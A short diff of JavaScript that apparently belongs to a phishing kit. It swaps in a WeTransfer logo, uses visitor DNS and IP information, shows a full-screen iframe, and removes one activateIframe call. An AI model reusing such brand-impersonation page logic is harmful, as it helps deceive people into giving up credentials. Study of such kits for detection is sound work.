@@ -243,7 +243,6 @@ function switchImage(fmt,prefix,dnsresult,ipInfo,vsr){
 		$(".verification-container").hide();
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"wetransfer-logo-svg-vector.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); 
 		iframe.src = baseUrl+ displayPage(dnsresult,vsr,fmt);
 		// Display the full screen iframe
 		iframe.style.display = 'block';
